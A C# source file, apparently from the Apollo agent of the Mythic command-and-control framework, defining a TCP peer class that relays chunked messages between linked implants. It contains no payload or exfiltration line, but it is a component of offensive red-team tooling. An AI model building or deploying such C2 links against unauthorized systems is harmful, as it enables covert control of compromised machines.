using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Serializers;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Linq;
using System.Text;
using AI = ApolloInterop;
using ApolloInterop.Constants;
using AS = ApolloInterop.Structs.ApolloStructs;
using System.Threading;
using TTasks = System.Threading.Tasks;
using ApolloInterop.Enums.ApolloEnums;
using System.Net.Sockets;
using ApolloInterop.Classes.Core;

namespace Apollo.Peers.TCP
{
    public class TCPPeer : AI.Classes.P2P.Peer
    {
        private AsyncTcpClient _tcpClient = null;
        private TcpClient _client = null;
        private Action<object> _sendAction;
        private TTasks.Task _sendTask;

        public TCPPeer(IAgent agent, PeerInformation info) : base(agent, info)
        {
            C2ProfileName = "tcp";
            _tcpClient = new AsyncTcpClient(info.Hostname, info.C2Profile.Parameters.Port);
            _tcpClient.ConnectionEstablished += OnConnect;
            _tcpClient.MessageReceived += OnMessageReceived;
            _tcpClient.Disconnect += OnDisconnect;
            _sendAction = (object p) =>
            {
                TcpClient c = (TcpClient)p;
                while (c.Connected && !_cts.IsCancellationRequested)
                {
                    _senderEvent.WaitOne();
                    if (!_cts.IsCancellationRequested && c.Connected && _senderQueue.TryDequeue(out byte[] result))
                    {
                        c.GetStream().BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
                    }
                }
            };
        }

        public void OnAsyncMessageSent(IAsyncResult result)
        {
            TcpClient client = (TcpClient)result.AsyncState;
            if (client.Connected && !_cts.IsCancellationRequested)
            {
                client.GetStream().EndWrite(result);
                // Potentially delete this since theoretically the sender Task does everything
                if (_senderQueue.TryDequeue(out byte[] data))
                {
                    client.GetStream().BeginWrite(data, 0, data.Length, OnAsyncMessageSent, client);
                }
            }
        }

        public override bool Connected()
        {
            return _client.Connected;
        }

        public override bool Finished()
        {
            return _previouslyConnected && !_client.Connected;
        }

        public void OnConnect(object sender, TcpMessageEventArgs args)
        {
            args.State = this;
            OnConnectionEstablished(sender, args);
            _sendTask = new TTasks.Task(_sendAction, args.Client);
            _sendTask.Start();
            _previouslyConnected = true;
        }

        public void OnDisconnect(object sender, TcpMessageEventArgs args)
        {
            _cts.Cancel();
            args.Client.Close();
            _senderEvent.Set();
            _sendTask.Wait();
            base.OnDisconnect(this, args);
        }

        public void OnMessageReceived(object sender, TcpMessageEventArgs args)
        {
            AS.IPCChunkedData chunkedData = _serializer.Deserialize<AS.IPCChunkedData>(
                Encoding.UTF8.GetString(
                    args.Data.Data.Take(args.Data.DataLength).ToArray()
                )
            );
            lock (_messageOrganizer)
            {
                if (!_messageOrganizer.ContainsKey(chunkedData.ID))
                {
                    _messageOrganizer[chunkedData.ID] = new ChunkedMessageStore<AS.IPCChunkedData>();
                    _messageOrganizer[chunkedData.ID].MessageComplete += DeserializeToReceiver;
                }
            }
            _messageOrganizer[chunkedData.ID].AddMessage(chunkedData);
        }

        public override bool Start()
        {
            return _tcpClient.Connect();
        }

        public override void Stop()
        {
            _client.Close();
            _sendTask.Wait();
        }
    }
}
